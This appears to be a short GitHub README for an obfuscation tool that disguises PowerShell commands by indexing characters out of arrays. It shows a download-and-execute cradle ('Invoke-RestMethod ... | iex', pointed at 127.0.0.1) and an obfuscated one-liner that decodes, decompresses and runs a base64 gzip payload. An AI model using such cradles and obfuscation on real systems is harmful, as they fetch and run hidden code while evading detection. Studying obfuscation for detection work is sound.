# Obfuscation_tools
The script String_obfuscation.py abuses PowerShell's ability to index an array to replace characters in a string.

Examples of this technique:

_##Invoke-RestMethod -uri 127.0.0.1/test.ps1 | iex##_

&([ScriptBlock]::Create((New-Object IO.StreamReader(New-Object IO.Compression.GzipStream((New-Object IO.MemoryStream(,[Convert]::FromBase64String('H4sIAPmod2YC/81TS2+jMBD+K3tqE6VtTJ6kUg+8mpiHCeAAodoDAYeQhPByCKD98Uu0Pax67qGWRvbMNxrPfJrvoffQ+7CCIs4of06D0+/XV6EgPiW9HiK3Z313JAH9BfUXi3bhxCR+SIovkJAmWUHKMk4vL8s2zv6lfi2gkSQtmk/s6UNILxUpaPffe5EmvF+S2aQD40vUe1xNSsitkzQcbYUho8vKaq0E2kzvbrW8uIYmwoY5SkBDsKYiNinyjKL18wL7ZWepHe43eEv19hSVMbUNw4khSo829guothDQhbi5WTIVZGmklVzu3zDeKZHMqee9HAvvXHce+/3+08eX6f57a2lIuuZFEnzGuvyXOz04lS5hr/P6z9ci/vH0jh3D2FBRM9pVxdbRHEhLHOoDlMbR+3jlukGgbxhuHR0584zUan4YOOWpJEjEqADj3Xi0GwbDA0suw8G+aub76aGBp5mNeLiSM0/beFwRRHPJ3HKtZzlX3lym0mmSsgchy6rzdVTsNs6gQdp+KQgqsDFUOU5LFgqGm8heXh1FWO6DeqEPhuSYs/spS7MRrUkYNZdxUFXMyDUTs1VsNmMCVwKttnrfFvEEwTEBgeuV67RyZpPJ4YrjLR02/s4lt3jqzGrGzSCudya79m15sc4beYAa4IXsNJkTtit9s89kElvXQYi92iLhsGzFDuGEbjvevmE9/jz8fO1pMq7QWmRz1eLYjN61pxqAaSUARAmgcAmYs1ChPKcojzurbWZhohjMdUtoFMbm+RyyoxjZKC+jSjsaLUCYhwmAZ7wFN6ub/K7B48rhOUEpPdM5GHf1vX0HwX8BhcCphdwEAAA='))),[IO.Compression.CompressionMode]::Decompress))).ReadToEnd()))

![image](https://github.com/0xB4DC0DE/Obfuscation_tools/assets/26174989/7f622713-f02d-410f-894c-f367599ff0f0)
